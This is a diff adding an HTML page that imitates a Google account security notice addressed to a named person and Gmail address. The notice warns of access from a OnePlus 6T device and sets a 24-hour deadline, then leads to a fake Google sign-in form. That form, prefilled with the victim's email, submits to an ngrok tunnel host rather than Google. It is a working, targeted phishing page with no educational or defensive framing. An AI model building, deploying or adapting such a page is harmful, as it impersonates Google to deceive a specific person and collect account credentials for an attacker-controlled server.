@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Google Account Verification</title>
+  <style>
+    body {
+      font-family: 'Roboto', sans-serif;
+      background: #f2f2f2;
+      margin: 0;
+      padding: 0;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: 60px auto;
+      background: #fff;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+
+    .google-logo {
+      font-size: 32px;
+      font-weight: bold;
+      letter-spacing: -2px;
+      margin-bottom: 20px;
+    }
+
+    .google-logo span:nth-child(1) { color: #4285F4; }
+    .google-logo span:nth-child(2) { color: #EA4335; }
+    .google-logo span:nth-child(3) { color: #FBBC05; }
+    .google-logo span:nth-child(4) { color: #4285F4; }
+    .google-logo span:nth-child(5) { color: #34A853; }
+    .google-logo span:nth-child(6) { color: #EA4335; }
+
+    .notice {
+      background: #fff8e1;
+      border-left: 5px solid #f4b400;
+      padding: 15px;
+      color: #333;
+      text-align: left;
+    }
+
+    .footer {
+      margin-top: 30px;
+      font-size: 12px;
+      color: #888;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      margin-top: 8px;
+      margin-bottom: 20px;
+    }
+
+    .blue-link {
+      color: #1a73e8;
+      font-size: 14px;
+      text-decoration: none;
+      display: inline-block;
+    }
+
+    .link-stack {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+
+    .next-btn {
+      background-color: #1a73e8;
+      color: white;
+      padding: 10px 20px;
+      font-size: 14px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    .full-btn {
+      width: 100%;
+      background-color: #1a73e8;
+      color: white;
+      padding: 12px 0;
+      font-size: 16px;
+      border: none;
+      border-radius: 5px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+
+    .learn-more {
+      color: #1a73e8;
+      font-size: 14px;
+      margin-bottom: 15px;
+      text-decoration: none;
+      display: inline-block;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- 🔐 Ownership Verification Page -->
+  <div class="container" id="verify-page">
+    <div class="google-logo">
+      <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+    </div>
+    <div class="notice">
+      Dear <strong>Shahriar</strong>,<br><br>
+      Your Google Account (shahriarnafiz1828@gmail.com) has been accessed from a <strong>OnePlus 6T</strong> device.<br><br>
+      If you are the rightful owner, please confirm below.<br><br>
+      ⚠️ You have 24 hours to verify.
+    </div>
+    <button class="full-btn" onclick="showEmailPage()">Verify Ownership</button>
+    <div class="footer">Thanks,<br>The Google Account Team</div>
+  </div>
+
+  <!-- ✉️ Email Page -->
+  <div class="container hidden" id="email-page">
+    <div class="google-logo">
+      <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+    </div>
+    <h2>Sign in</h2>
+    <p>Use your Google Account. The account will be added to this device and available to other Google apps.</p>
+    <a href="#" class="learn-more">Learn more about using your account</a>
+
+    <form action="https://2a5d-45-112-72-5.ngrok-free.app">
+      <input type="text" placeholder="Email or phone" id="emailInput" name="email" value="shahriarnafiz1828@gmail.com">
+      <div class="link-stack">
+        <div>
+          <a href="#" class="blue-link">Forgot email?</a><br>
+          <a href="#" class="blue-link">Create account</a>
+        </div>
+        <button class="next-btn" type="submit">Next</button>
+      </div>
+    </form>
+  </div>
+
+  <script>
+    function showEmailPage() {
+      document.getElementById("verify-page").style.display = "none";
+      document.getElementById("email-page").classList.remove("hidden");
+    }
+  </script>
+
+</body>
+</html>
